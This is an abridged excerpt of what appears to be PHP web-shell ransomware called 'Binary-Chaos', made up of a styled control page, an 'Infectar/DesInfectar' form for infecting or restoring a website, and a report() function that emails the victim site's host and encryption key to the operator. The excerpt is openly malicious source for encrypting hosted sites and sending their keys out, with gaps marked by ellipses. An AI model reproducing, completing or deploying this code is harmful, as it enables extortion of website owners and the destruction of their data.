...
<html>
<head>
   <title>RasomWare - Binary-Chaos</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
...
class deRanSomeware
{
   ...
   public function report($key){
        $message.= "=========     Binary-Chaos Ransomware    =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= Binary-Chaos (2018) Binary-Chaos =========\n";
        $subject = "Report Ransomeware";
        $headers = "From: Ransomware <correo@gmail.com>\r\n";
...
<form action="" method="post" style=" text-align: center;">
      ...
      <select name="method" class="selecte">
         <option value="1">Infectar</option>
         <option value="2">DesInfectar</option>
      </select>
